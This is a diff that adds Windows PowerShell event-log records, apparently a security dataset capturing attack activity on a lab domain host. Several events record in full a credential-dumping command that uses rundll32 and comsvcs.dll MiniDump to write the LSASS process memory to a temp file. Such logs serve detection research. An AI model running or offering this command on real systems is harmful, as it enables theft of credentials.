+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1322</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">
+      </Data>
+      <Data Name="ScriptBlockId">0783d7d2-2c3f-405e-b294-070c778241d6</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1323</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Read-Host 'Press Enter to continue...' | Out-Null</Data>
+      <Data Name="ScriptBlockId">8bda6354-51f2-4779-ac7b-603934bc393a</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.302720700Z" />
+      <EventRecordID>1324</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">$this.ServiceName</Data>
+      <Data Name="ScriptBlockId">5336aa33-1fb7-4d40-bfbf-f0eb6d0c659f</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.302720700Z" />
+      <EventRecordID>1325</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">[System.Management.ManagementDateTimeConverter]::ToDateTime($args[0])</Data>
+      <Data Name="ScriptBlockId">6183a262-7846-45f4-af7a-4622cd671790</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.302720700Z" />
+      <EventRecordID>1326</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">[System.Management.ManagementDateTimeConverter]::ToDmtfDateTime($args[0])</Data>
+      <Data Name="ScriptBlockId">701d6e25-2203-4c4a-83b0-f3f656166317</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>40962</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>2</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.333968800Z" />
+      <EventRecordID>1327</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.349591900Z" />
+      <EventRecordID>1328</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="1584" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id</Data>
+      <Data Name="ScriptBlockId">4b8cd779-8c92-48a7-b407-8a119e38c45a</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.396470600Z" />
+      <EventRecordID>1329</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-79f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="1584" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">@{
+GUID="EEFCB906-B326-4E99-9F54-8B4BB6EF3C6D"
+Author="Microsoft Corporation"
+CompanyName="Microsoft Corporation"
+Copyright="⌐ Microsoft Corporation. All rights reserved."
+ModuleVersion="3.1.0.0"
+PowerShellVersion="3.0"
+CLRVersion="4.0"
+NestedModules="Microsoft.PowerShell.Commands.Management.dll"
+HelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285756'
+CmdletsToExport=@("Add-Content",
+    "Clear-Content",
+    "Clear-ItemProperty",
+    "Join-Path",
+    "Convert-Path",
+    "Copy-ItemProperty",
+    "Get-EventLog",
+    "Clear-EventLog",
+    "Write-EventLog",
+    "Limit-EventLog",
+    "Show-EventLog",
+    "New-EventLog",
+    "Remove-EventLog",
+    "Get-ChildItem",
+    "Get-Content",
+    "Get-ItemProperty",
+    "Get-WmiObject",
+    "Invoke-WmiMethod",
+    "Move-ItemProperty",
+    "Get-Location",
+    "Set-Location",
+    "Push-Location",
+    "Pop-Location",
+    "New-PSDrive",
+    "Remove-PSDrive",
+    "Get-PSDrive",
+    "Get-Item",
+    "New-Item",
+    "Set-Item",
+    "Remove-Item",
+    "Move-Item",
+    "Rename-Item",
+    "Copy-Item",
+    "Clear-Item",
+    "Invoke-Item",
+    "Get-PSProvider",
+    "New-ItemProperty",
+    "Split-Path",
+    "Test-Path",
+    "Get-Process",
+    "Stop-Process",
+    "Wait-Process",
+    "Debug-Process",
+    "Start-Process",
+    "Remove-ItemProperty",
+    "Remove-WmiObject",
+    "Rename-ItemProperty",
+    "Register-WmiEvent",
+    "Resolve-Path",
+    "Get-Service",
+    "Stop-Service",
+    "Start-Service",
+    "Suspend-Service",
+    "Resume-Service",
+    "Restart-Service",
+    "Set-Service",
+    "New-Service",
+    "Set-Content",
+    "Set-ItemProperty",
+    "Set-WmiInstance",
+    "Get-Transaction",
+    "Start-Transaction",
+    "Complete-Transaction",
+    "Undo-Transaction",
+    "Use-Transaction",
+    "New-WebServiceProxy",
+    "Get-HotFix",
+    "Test-Connection",
+    "Enable-ComputerRestore",
+    "Disable-ComputerRestore",
+    "Checkpoint-Computer",
+    "Get-ComputerRestorePoint",
+    "Restart-Computer",
+    "Stop-Computer",
+    "Restore-Computer",
+    "Add-Computer",
+    "Remove-Computer",
+    "Test-ComputerSecureChannel",
+    "Reset-ComputerMachinePassword",
+    "Rename-Computer",
+    "Get-ControlPanelItem",
+    "Show-ControlPanelItem")
+}
+</Data>
+      <Data Name="ScriptBlockId">62c273e1-22da-44fc-a6c3-5cb365453815</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.427730300Z" />
+      <EventRecordID>1330</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0001-e190-86a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="1584" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 4.0
+        Host ID = 63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+        Host Application = powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+        Engine Version = 4.0
+        Runspace ID = 1668d864-c13c-442c-bf70-3fe6a4dee2ca
+        Pipeline ID = 1
+        Command Name = Get-Process
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 16
+        User = OFFSEC\admmig
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(Get-Process): "Get-Process"
+ParameterBinding(Get-Process): name="Name"; value="lsass"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.427730300Z" />
+      <EventRecordID>1331</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-7af7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="1584" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 4.0
+        Host ID = 63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+        Host Application = powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+        Engine Version = 4.0
+        Runspace ID = 1668d864-c13c-442c-bf70-3fe6a4dee2ca
+        Pipeline ID = 1
+        Command Name = Get-Process
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 18
+        User = OFFSEC\admmig
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(Get-Process): "Get-Process"
+ParameterBinding(Get-Process): name="Name"; value="rundll32"
+</Data>
+    </EventData>
+  </Event>
+</root>
